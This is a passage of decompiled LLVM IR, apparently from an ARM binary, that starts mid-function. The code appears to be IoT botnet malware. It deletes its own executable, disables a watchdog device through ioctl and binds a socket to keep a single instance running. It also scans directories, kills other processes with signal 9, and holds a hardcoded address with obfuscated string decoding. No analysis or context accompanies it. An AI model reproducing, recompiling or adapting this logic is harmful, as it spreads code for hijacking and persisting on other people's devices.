  %v6_fe68 = zext i8 %v4_fe68 to i32
  store i32 %v6_fe68, i32* %r2.global-to-local, align 4
  %v2_fe6c = add i32 %storemerge.in, %v1_fe6c.pre
  %v3_fe6c = inttoptr i32 %v2_fe6c to i8*
  %v4_fe6c = load i8, i8* %v3_fe6c, align 1
  %v6_fe6c = zext i8 %v4_fe6c to i32
  store i32 %v6_fe6c, i32* %r3.global-to-local, align 4
  %v9_fe70 = icmp eq i8 %v4_fe6c, %v4_fe68
  %v1_fe74 = add i32 %v0_fe74, 1
  %v1_fe74. = select i1 %v9_fe70, i32 %v1_fe74, i32 0
  br i1 %v9_fe70, label %dec_label_pc_fe54, label %dec_label_pc_fe60.backedge

dec_label_pc_fe88:                                ; preds = %dec_label_pc_fd94
  %v9_fe88 = icmp eq i32 %v3_fd78, %v1_fda4.
  br i1 %v9_fe88, label %dec_label_pc_fe90, label %dec_label_pc_fdb0

dec_label_pc_fe90:                                ; preds = %dec_label_pc_fdb8, %dec_label_pc_fdec, %dec_label_pc_fe20, %dec_label_pc_fe54, %dec_label_pc_fe88
  %v1_fe94 = call i32 @function_12fbc(i32 12)
  %v1_fe9c = call i32 @function_12fbc(i32 13)
  %v1_fea4 = call i32 @function_12fbc(i32 14)
  %v1_feac = call i32 @function_12fbc(i32 15)
  %v1_feb4 = call i32 @function_12fbc(i32 16)
  %v1_febc = call i32 @close(i32 %v4_fc54)
  %v0_fec0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_fec8 = call i32 @kill(i32 %v0_fec0, i32 9)
  br label %dec_label_pc_fecc

dec_label_pc_fecc:                                ; preds = %dec_label_pc_fc48, %dec_label_pc_ff10, %dec_label_pc_fe90
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_fed8 = call i32 @function_13a3c(i32 %v2_fac8, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_fee8 = call i32 @function_13a3c(i32 %v2_fb18, i32 64)
  %v1_fef0 = call i32 @sleep(i32 1)
  store i32 %v2_fa9c, i32* @r4, align 4
  %v0_fef8 = load i32, i32* @r7, align 4
  store i32 %v0_fef8, i32* @r5, align 4
  br label %dec_label_pc_f9fc.backedge

dec_label_pc_ff00:                                ; preds = %dec_label_pc_fc28
  %v0_ff00 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ff08 = call i32 @kill(i32 %v0_ff00, i32 9)
  %v0_fc40.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fc40

dec_label_pc_ff10:                                ; preds = %dec_label_pc_fcec.backedge, %dec_label_pc_fc64
  %v1_ff14 = call i32 @function_12fbc(i32 12)
  %v1_ff1c = call i32 @function_12fbc(i32 13)
  %v1_ff24 = call i32 @function_12fbc(i32 14)
  %v1_ff2c = call i32 @function_12fbc(i32 15)
  %v1_ff34 = call i32 @function_12fbc(i32 16)
  %v1_ff3c = call i32 @close(i32 %v4_fc54)
  br label %dec_label_pc_fecc

; uselistorder directives
  uselistorder i32 %v1_fe74., { 1, 0 }
  uselistorder i1 %v9_fe70, { 1, 0 }
  uselistorder i32 %v0_fe74, { 1, 0 }
  uselistorder i32 %v1_fe40., { 1, 0 }
  uselistorder i1 %v9_fe3c, { 1, 0 }
  uselistorder i32 %v0_fe40, { 1, 0 }
  uselistorder i32 %v1_fe0c., { 1, 0 }
  uselistorder i1 %v9_fe08, { 1, 0 }
  uselistorder i32 %v0_fe0c, { 1, 0 }
  uselistorder i32 %v1_fdd8., { 1, 0 }
  uselistorder i1 %v9_fdd4, { 1, 0 }
  uselistorder i32 %v0_fdd8, { 1, 0 }
  uselistorder i32 %v1_fda4., { 1, 2, 0 }
  uselistorder i1 %v9_fda0, { 1, 0 }
  uselistorder i32 %v0_fda4, { 1, 0 }
  uselistorder i32 %v0_fdb0, { 1, 0 }
  uselistorder i32 %v4_fcf8, { 1, 0 }
  uselistorder i32 %v4_fc54, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v4_fc30, { 1, 2, 0 }
  uselistorder %dirent* %v3_fa00, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v7_fb78, { 1, 2, 0 }
  uselistorder i32 %v2_fb74, { 1, 0 }
  uselistorder %dirent* %v3_fa80, { 1, 0 }
  uselistorder i32 %v1_fa30, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %v5_f9e8, { 1, 0 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_fb18, { 1, 0, 2 }
  uselistorder i32 %v2_fac8, { 1, 0, 2, 3 }
  uselistorder i32 %v7_f994, { 1, 0 }
  uselistorder i32 %v4_f960, { 2, 0, 1 }
  uselistorder i32 %v2_f904, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_f890, { 1, 0 }
  uselistorder i32 %storemerge175, { 1, 0 }
  uselistorder i32 %v0_f820, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-8408, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %sl.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 17, 5, 4, 16, 3, 2, 6, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 1, 46, 47, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32 64, { 6, 10, 7, 11, 12, 13, 8, 14, 15, 16, 0, 17, 18, 19, 1, 20, 21, 22, 9, 23, 24, 25, 2, 26, 27, 28, 3, 29, 30, 31, 32, 33, 4, 34, 35, 36, 37, 38, 5, 39, 40 }
  uselistorder i32 (%__dirstream*)* @closedir, { 2, 0, 1, 3 }
  uselistorder %dirent* null, { 4, 3, 1, 5, 6, 7, 0, 8, 2 }
  uselistorder %dirent* (%__dirstream*)* @readdir, { 7, 6, 1, 8, 4, 5, 0, 3, 2, 9 }
  uselistorder %__dirstream* (i8*)* @opendir, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i8*, i32)* @readlink, { 2, 3, 1, 0, 4 }
  uselistorder i8** @global_var_1cd4c.159, { 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1cd4c.159 to i32), { 2, 1, 0 }
  uselistorder i32 4096, { 5, 9, 1, 2, 6, 7, 0, 8, 3, 4 }
  uselistorder i32* @global_var_1cd50.151, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fecc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fe90, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fd04, { 1, 0 }
  uselistorder label %dec_label_pc_fc48, { 1, 0 }
  uselistorder label %dec_label_pc_fc40, { 1, 0 }
  uselistorder label %dec_label_pc_f9fc.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_fbe4, { 1, 0 }
  uselistorder label %dec_label_pc_fa0c, { 1, 0 }
  uselistorder label %dec_label_pc_fa0c.preheader, { 1, 0 }
  uselistorder label %bb217, { 1, 0 }
  uselistorder label %dec_label_pc_f8bc, { 1, 0 }
}

define i32 @function_ff50(i32 %arg1) local_unnamed_addr {
dec_label_pc_ff50:
  store i32 ptrtoint (i32* @global_var_100d8.161 to i32), i32* @global_var_1cca8.163, align 4
  %v1_ff5c = load i32, i32* @r0, align 4
  ret i32 %v1_ff5c
}

define i32 @function_ff68() local_unnamed_addr {
dec_label_pc_ff68:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_ff68 = load i32, i32* @r4, align 4
  %v9_ff68 = load i32, i32* @r6, align 4
  %v15_ff68 = load i32, i32* @r8, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_ff84 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1cca0.165 to i32), i32* @r6, align 4
  %v7_ff8c = icmp eq i32 %v3_ff84, -1
  store i32 %v3_ff84, i32* @global_var_1cca0.165, align 4
  br i1 %v7_ff8c, label %dec_label_pc_1004c, label %dec_label_pc_ff98

dec_label_pc_ff98:                                ; preds = %dec_label_pc_ff68
  %v0_ff9c = load i32, i32* %r4.global-to-local, align 4
  %v6_ffac = call i32 @setsockopt(i32 %v3_ff84, i32 %v0_ff9c, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_ffb0 = load i32, i32* @global_var_1cca0.165, align 4
  store i32 %v2_ffb0, i32* %r4.global-to-local, align 4
  %v2_ffc0 = call i32 (i32, i32, ...) @fcntl(i32 %v2_ffb0, i32 3)
  %v2_ffd0 = call i32 (i32, i32, ...) @fcntl(i32 %v2_ffb0, i32 4)
  store i32 ptrtoint (i8** @global_var_1ccac.167 to i32), i32* @r8, align 4
  %v2_ffd8 = load i8, i8* bitcast (i8** @global_var_1ccac.167 to i8*), align 4
  %v2_ffdc = icmp eq i8 %v2_ffd8, 0
  br i1 %v2_ffdc, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_ff98
  br label %bb

.thread:                                          ; preds = %dec_label_pc_ff98
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_10014 = call i32* @__errno_location()
  %v2_10014 = ptrtoint i32* %v0_10014 to i32
  %v0_10018 = load i32, i32* @r5, align 4
  store i32 %v0_10018, i32* %v0_10014, align 4
  %v2_1001c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1001c, i32* @r7, align 4
  store i32 %v2_10014, i32* %r4.global-to-local, align 4
  %tmp21 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v2_10028 = load i32, i32* @global_var_1cca0.165, align 4
  %v5_10030 = call i32 @bind(i32 %v2_10028, %sockaddr* %tmp21, i32 16)
  %v7_10034 = icmp eq i32 %v5_10030, -1
  br i1 %v7_10034, label %dec_label_pc_10054, label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %bb
  %v2_10044 = load i32, i32* @global_var_1cca0.165, align 4
  %v2_10048 = call i32 @listen(i32 %v2_10044, i32 1)
  br label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_ff68, %dec_label_pc_10060, %dec_label_pc_1003c
  %v20_10050 = phi i32 [ %v3_ff84, %dec_label_pc_ff68 ], [ %v0_100b0, %dec_label_pc_10060 ], [ %v2_10048, %dec_label_pc_1003c ]
  store i32 %v3_ff68, i32* @r4, align 4
  store i32 %v9_ff68, i32* @r6, align 4
  store i32 %v15_ff68, i32* @r8, align 4
  ret i32 %v20_10050

dec_label_pc_10054:                               ; preds = %bb
  %v0_10054 = load i32, i32* %r4.global-to-local, align 4
  %v1_10054 = inttoptr i32 %v0_10054 to i32*
  %v2_10054 = load i32, i32* %v1_10054, align 4
  %v7_10058 = icmp eq i32 %v2_10054, 99
  br i1 %v7_10058, label %dec_label_pc_100b8, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %dec_label_pc_100b8, %bb22, %dec_label_pc_10054
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_10078 = load i32, i32* @global_var_1cca0.165, align 4
  %v3_10090 = call i32 @_connect(i32 %v2_10078, i32 %v2_1001c, i32 16)
  %v1_10098 = call i32 @sleep(i32 5)
  %v2_1009c = load i32, i32* @global_var_1cca0.165, align 4
  %v1_100a0 = call i32 @close(i32 %v2_1009c)
  %v1_100ac = call i32 @function_f29c(i32 58811)
  %v0_100b0 = call i32 @function_ff68()
  br label %dec_label_pc_1004c

dec_label_pc_100b8:                               ; preds = %dec_label_pc_10054
  %v2_100b8 = load i8, i8* bitcast (i8** @global_var_1ccac.167 to i8*), align 4
  %v3_100b8 = zext i8 %v2_100b8 to i32
  %v1_100bc = load i32, i32* @r5, align 4
  %v9_100bc = icmp eq i32 %v3_100b8, %v1_100bc
  br i1 %v9_100bc, label %dec_label_pc_10060, label %bb22

bb22:                                             ; preds = %dec_label_pc_100b8
  %v2_100c4 = trunc i32 %v1_100bc to i8
  store i8 %v2_100c4, i8* bitcast (i8** @global_var_1ccac.167 to i8*), align 4
  br label %dec_label_pc_10060

; uselistorder directives
  uselistorder i32 %v3_ff84, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_f29c, { 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0, 2 }
  uselistorder i8* bitcast (i8** @global_var_1ccac.167 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1ccac.167, { 1, 0 }
  uselistorder label %dec_label_pc_10060, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1004c, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_100d8() local_unnamed_addr {
dec_label_pc_100d8:
  %stack_var_-16 = alloca i32, align 4
  %v3_100d8 = load i32, i32* @r4, align 4
  store i32 %v3_100d8, i32* %stack_var_-16, align 4
  %v1_100e0 = call i32 @function_13074(i32 3)
  %v3_100ec = call i32 @function_12f90(i32 3, i32* null)
  %v1_100f0 = inttoptr i32 %v3_100ec to i8*
  %v2_100f0 = call i32 @function_10e4c(i8* %v1_100f0)
  store i32 %v2_100f0, i32* @r5, align 4
  %v1_100fc = call i32 @function_12fbc(i32 3)
  %v0_10100 = load i32, i32* @r5, align 4
  %v2_10100 = icmp eq i32 %v0_10100, 0
  br i1 %v2_10100, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_100d8
  ret i32 %v1_100fc

bb5:                                              ; preds = %dec_label_pc_100d8
  %v1_1010c = add i32 %v0_10100, 4
  %v2_1010c = inttoptr i32 %v1_1010c to i32*
  %v3_1010c = load i32, i32* %v2_1010c, align 4
  store i32 %v3_1010c, i32* @r4, align 4
  %v0_10110 = call i32 @function_10b68()
  %v0_10114 = load i32, i32* @r5, align 4
  %v1_10114 = inttoptr i32 %v0_10114 to i8*
  %v2_10114 = load i8, i8* %v1_10114, align 1
  %v3_10114 = zext i8 %v2_10114 to i32
  %v2_10118 = urem i32 %v0_10110, %v3_10114
  %v0_1011c = load i32, i32* @r4, align 4
  %v4_1011c = mul nuw nsw i32 %v2_10118, 4
  %v5_1011c = add i32 %v0_1011c, %v4_1011c
  %v6_1011c = inttoptr i32 %v5_1011c to i32*
  %v7_1011c = load i32, i32* %v6_1011c, align 4
  store i32 %v7_1011c, i32* @global_var_1cd58.171, align 4
  %v2_10128 = inttoptr i32 %v0_10114 to i32*
  %v3_10128 = call i32 @function_10e28(i32* %v2_10128, i32 %v3_10114)
  %v1_10130 = call i32 @function_13074(i32 4)
  %v3_1013c = call i32 @function_12f90(i32 4, i32* null)
  %v4_1013c = inttoptr i32 %v3_1013c to i8*
  %v2_10140 = add i32 %v3_1013c, 1
  %v3_10140 = inttoptr i32 %v2_10140 to i8*
  %v4_10140 = load i8, i8* %v3_10140, align 1
  %v3_10144 = load i8, i8* %v4_1013c, align 1
  store i8 %v4_10140, i8* bitcast (i32* @global_var_1cd57.172 to i8*), align 4
  store i8 %v3_10144, i8* bitcast (i32* @global_var_1cd56.173 to i8*), align 4
  %v2_1015c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1015c, i32* @r4, align 4
  %v1_10160 = call i32 @function_12fbc(i32 4)
  %v0_10164 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10164, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_10160

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_10168(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10168:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %tmp14 = call i8 @__decompiler_undefined_function_1()
  %tmp20 = call i8 @__decompiler_undefined_function_1()
  %tmp24 = call i8 @__decompiler_undefined_function_1()
  %tmp28 = call i8 @__decompiler_undefined_function_1()
  %tmp32 = call i8 @__decompiler_undefined_function_1()
  %tmp35 = call i8 @__decompiler_undefined_function_1()
  %tmp36 = call i8 @__decompiler_undefined_function_1()
  %tmp38 = call i8 @__decompiler_undefined_function_1()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-38 = alloca i8, align 1
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-592 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-170 = alloca i32, align 4
  %stack_var_-138 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-106 = alloca i8, align 1
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-464 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10168 = load i32, i32* @r4, align 4
  store i32 %v3_10168, i32* %stack_var_-36, align 4
  %v6_10168 = load i32, i32* @r5, align 4
  %v15_10168 = load i32, i32* @r8, align 4
  %v2_10178 = ptrtoint i32* %stack_var_-464 to i32
  store i32 %v2_10178, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_10180 = load i32, i32* %arg2, align 4
  %v3_10180 = inttoptr i32 %v2_10180 to i8*
  store i32 %tmp, i32* @r6, align 4
  %v3_10188 = call i32 @unlink(i8* %v3_10180)
  store i32 %v2_10178, i32* @r0, align 4
  %v1_10190 = call i32 @_sigemptyset(i32 %v2_10178)
  %tmp85 = bitcast i32* %stack_var_-464 to %_TYPEDEF_sigset_t*
  %v4_1019c = call i32 @sigaddset(%_TYPEDEF_sigset_t* %tmp85, i32 2)
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_101ac = call i32 @sigprocmask(i32 %v2_10178, %_TYPEDEF_sigset_t* null, %_TYPEDEF_sigset_t* null)
  %v4_101b8 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i32 1 to void (i32)*))
  %v4_101c4 = call void (i32)* @signal(i32 5, void (i32)* bitcast (void (i32)** @global_var_ff50.175 to void (i32)*))
  %v4_101d0 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_14350.177, i32 0, i32 0), i32 2)
  %v7_101d4 = icmp eq i32 %v4_101d0, -1
  store i32 %v4_101d0, i32* @r4, align 4
  br i1 %v7_101d4, label %dec_label_pc_10558, label %dec_label_pc_101e0

dec_label_pc_101e0:                               ; preds = %dec_label_pc_10558, %dec_label_pc_10168
  %v0_101f4 = phi i32 [ %v4_10560, %dec_label_pc_10558 ], [ %v4_101d0, %dec_label_pc_10168 ]
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_101f8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_101f8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v5_10200 = call i32 @_ioctl(i32 %v0_101f4, i32 -2147199228, i32 %v2_101f8, i32 1, i32 1)
  %v0_10204 = load i32, i32* @r4, align 4
  %v1_10208 = call i32 @close(i32 %v0_10204)
  br label %dec_label_pc_1020c

dec_label_pc_1020c:                               ; preds = %dec_label_pc_10558, %dec_label_pc_101e0
  %v3_10210 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_14300.78, i32 0, i32 0))
  %v0_10214 = call i32 @function_13c54()
  store i32 ptrtoint (i32* @global_var_1cd48.140 to i32), i32* @fp, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r7, align 4
  store i8 80, i8* bitcast (i32* @global_var_1cd57.172 to i8*), align 4
  store i32 902487617, i32* @global_var_1cd58.171, align 4
  store i8 0, i8* bitcast (i32* @global_var_1cd56.173 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1cd55.182 to i8*), align 4
  store i32 %v0_10214, i32* @global_var_1cd48.140, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i8 2, i8* bitcast (i8** @global_var_1cd54.170 to i8*), align 4
  %v0_1025c = load i32, i32* @r6, align 4
  %v1_1025c = inttoptr i32 %v0_1025c to i32*
  %v2_1025c = load i32, i32* %v1_1025c, align 4
  store i32 %v2_1025c, i32* @r5, align 4
  %v3_10260 = bitcast i8* %stack_var_-106 to i32*
  %v5_10260 = call i32* @memcpy(i32* %v3_10260, i32* bitcast ([3 x i8]* @global_var_143a4.184 to i32*), i32 18)
  store i32 ptrtoint (i32* @global_var_143a0.199 to i32), i32* @r4, align 4
  store i32 add (i32 add (i32 ptrtoint (i32* @global_var_12fbc.194 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ff68.187 to i32), i32 ptrtoint (i32* @global_var_13074.189 to i32)), i32 77712), i32 ptrtoint (i32* @global_var_1312c.192 to i32))), i32 161684), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (void (i32)** @global_var_ff50.175 to i32), i32* %r2.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 add (i32 ptrtoint (i32* @global_var_12fbc.194 to i32), i32 add (i32 add (i32 add (i32 ptrtoint (i32* @global_var_ff68.187 to i32), i32 ptrtoint (i32* @global_var_13074.189 to i32)), i32 77712), i32 ptrtoint (i32* @global_var_1312c.192 to i32))), i32 161684), i32 0), label %dec_label_pc_1045c, label %dec_label_pc_102c8

dec_label_pc_102c8:                               ; preds = %dec_label_pc_1020c
  %v2_10230 = ptrtoint i8* %stack_var_-106 to i32
  %v3_102c8 = load i8, i8* %stack_var_-106, align 1
  %v4_102c8 = sext i8 %v3_102c8 to i32
  store i32 %v4_102c8, i32* %r2.global-to-local, align 4
  %v4_102cc = zext i8 %tmp38 to i32
  store i32 %v4_102cc, i32* %r3.global-to-local, align 4
  %v0_102d0 = load i32, i32* @r5, align 4
  store i8 %tmp38, i8* %stack_var_-72, align 1
  %v1_102dc = inttoptr i32 %v0_102d0 to i8*
  %v2_102dc = call i32 @function_1399c(i8* %v1_102dc)
  %v0_102e4 = load i32, i32* @r7, align 4
  %v2_102e8 = srem i32 %v0_102e4, %v2_102dc
  %v4_102ec = zext i8 %tmp36 to i32
  store i32 %v4_102ec, i32* %r2.global-to-local, align 4
  %v4_102f0 = zext i8 %tmp35 to i32
  store i32 %v4_102f0, i32* %r3.global-to-local, align 4
  %v0_102f4 = load i32, i32* @r5, align 4
  %v2_102f4 = add i32 %v0_102f4, %v2_102e8
  %v3_102f4 = inttoptr i32 %v2_102f4 to i8*
  %v4_102f4 = load i8, i8* %v3_102f4, align 1
  %v6_102f4 = zext i8 %v4_102f4 to i32
  store i32 %v6_102f4, i32* %r4.global-to-local, align 4
  %v1_10304 = inttoptr i32 %v0_102f4 to i8*
  %v2_10304 = call i32 @function_1399c(i8* %v1_10304)
  %v2_10310 = srem i32 4, %v2_10304
  %v0_10314 = load i32, i32* %r4.global-to-local, align 4
  %v1_10314 = sub i32 -1, %v0_10314
  store i32 %v1_10314, i32* %r4.global-to-local, align 4
  %v0_10318 = load i32, i32* @r5, align 4
  %v2_10318 = add i32 %v0_10318, %v2_10310
  %v3_10318 = inttoptr i32 %v2_10318 to i8*
  %v4_10318 = load i8, i8* %v3_10318, align 1
  %v6_10318 = zext i8 %v4_10318 to i32
  %v4_1031c = zext i8 %tmp32 to i32
  store i32 %v4_1031c, i32* %r2.global-to-local, align 4
  %v1_10324 = sub i32 -82, %v0_10314
  %v1_10328 = sub nuw nsw i32 -1, %v6_10318
  store i32 %v1_10328, i32* %r3.global-to-local, align 4
  %v1_10330 = urem i32 %v1_10324, 256
  %v2_10334 = add nsw i32 %v1_10330, %v1_10328
  store i32 %v2_10334, i32* %r4.global-to-local, align 4
  %v1_10340 = inttoptr i32 %v0_10318 to i8*
  %v2_10340 = call i32 @function_1399c(i8* %v1_10340)
  %v2_1034c = srem i32 6, %v2_10340
  %v0_10350 = load i32, i32* @r5, align 4
  %v2_10350 = add i32 %v0_10350, %v2_1034c
  %v3_10350 = inttoptr i32 %v2_10350 to i8*
  %v4_10350 = load i8, i8* %v3_10350, align 1
  %v6_10350 = zext i8 %v4_10350 to i32
  %v4_10354 = zext i8 %tmp28 to i32
  store i32 %v4_10354, i32* %r2.global-to-local, align 4
  %v1_1035c = sub nuw nsw i32 -1, %v6_10350
  store i32 %v1_1035c, i32* %r3.global-to-local, align 4
  %v0_10364 = load i32, i32* %r4.global-to-local, align 4
  %v1_10364 = urem i32 %v0_10364, 256
  %v2_10368 = add nsw i32 %v1_10364, %v1_1035c
  store i32 %v2_10368, i32* %r4.global-to-local, align 4
  %v1_10374 = inttoptr i32 %v0_10350 to i8*
  %v2_10374 = call i32 @function_1399c(i8* %v1_10374)
  %v2_10380 = srem i32 8, %v2_10374
  %v0_10384 = load i32, i32* @r5, align 4
  %v2_10384 = add i32 %v0_10384, %v2_10380
  %v3_10384 = inttoptr i32 %v2_10384 to i8*
  %v4_10384 = load i8, i8* %v3_10384, align 1
  %v6_10384 = zext i8 %v4_10384 to i32
  %v4_10388 = zext i8 %tmp24 to i32
  store i32 %v4_10388, i32* %r2.global-to-local, align 4
  %v1_10390 = sub nuw nsw i32 -1, %v6_10384
  store i32 %v1_10390, i32* %r3.global-to-local, align 4
  %v0_10398 = load i32, i32* %r4.global-to-local, align 4
  %v1_10398 = urem i32 %v0_10398, 256
  %v2_1039c = add nsw i32 %v1_10398, %v1_10390
  store i32 %v2_1039c, i32* %r4.global-to-local, align 4
  %v1_103a8 = inttoptr i32 %v0_10384 to i8*
  %v2_103a8 = call i32 @function_1399c(i8* %v1_103a8)
  %v2_103b4 = srem i32 10, %v2_103a8
  %v0_103b8 = load i32, i32* @r5, align 4
  %v2_103b8 = add i32 %v0_103b8, %v2_103b4
  %v3_103b8 = inttoptr i32 %v2_103b8 to i8*
  %v4_103b8 = load i8, i8* %v3_103b8, align 1
  %v6_103b8 = zext i8 %v4_103b8 to i32
  %v4_103bc = zext i8 %tmp20 to i32
  store i32 %v4_103bc, i32* %r2.global-to-local, align 4
  %v1_103c4 = sub nuw nsw i32 -1, %v6_103b8
  store i32 %v1_103c4, i32* %r3.global-to-local, align 4
  %v0_103cc = load i32, i32* %r4.global-to-local, align 4
  %v1_103cc = urem i32 %v0_103cc, 256
  %v2_103d0 = add nsw i32 %v1_103cc, %v1_103c4
  store i32 %v2_103d0, i32* %r4.global-to-local, align 4
  %v1_103dc = inttoptr i32 %v0_103b8 to i8*
  %v2_103dc = call i32 @function_1399c(i8* %v1_103dc)
  %v2_103e8 = srem i32 12, %v2_103dc
  %v0_103ec = load i32, i32* @r5, align 4
  %v2_103ec = add i32 %v0_103ec, %v2_103e8
  %v3_103ec = inttoptr i32 %v2_103ec to i8*
  %v4_103ec = load i8, i8* %v3_103ec, align 1
  %v6_103ec = zext i8 %v4_103ec to i32
  %v0_103f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_103f4 = sub nuw nsw i32 -1, %v6_103ec
  store i32 %v1_103f4, i32* %r3.global-to-local, align 4
  %fold = add i32 %v0_103f0, %v1_103f4
  %v1_10400 = urem i32 %fold, 256
  %v2_10404 = urem i32 %v1_10400, 9
  %v1_10408 = load i32, i32* @r7, align 4
  %v6_10408 = shl i32 %v2_10404, %v1_10408
  %v2_10410 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10410, i32* %r2.global-to-local, align 4
  %v1_10414 = and i32 %v6_10408, 1020
  %v2_1041c = add i32 %v1_10414, %v2_10410
  %v2_10420 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_10420, i32* @r4, align 4
  %v1_10428 = add i32 %v2_1041c, -172
  %v2_10428 = inttoptr i32 %v1_10428 to i32*
  %v3_10428 = load i32, i32* %v2_10428, align 4
  call void @__pseudo_branch(i32 %v3_10428)
  %v0_1042c = load i32, i32* @r5, align 4
  %v2_10434 = inttoptr i32 %v0_1042c to i8*
  %v3_10434 = call i32 @function_13d7c(i8* %v2_10434, i32 %v2_10420)
  store i32 %v3_10434, i32* @r5, align 4
  %v2_10444 = call i32 @function_13a3c(i32 %v2_10230, i32 18)
  %v2_10450 = call i32 @function_13a3c(i32 %v2_10420, i32 12)
  %v0_10454 = load i32, i32* @r5, align 4
  %v1_10454 = urem i32 %v0_10454, 256
  %v2_10454 = icmp eq i32 %v1_10454, 0
  br i1 %v2_10454, label %dec_label_pc_1045c, label %dec_label_pc_10574

dec_label_pc_1045c:                               ; preds = %dec_label_pc_102c8, %dec_label_pc_1020c, %dec_label_pc_10574
  %v2_10460 = ptrtoint i32* %stack_var_-138 to i32
  store i32 %v2_10460, i32* @sl, align 4
  %v0_10464 = call i32 @function_ff68()
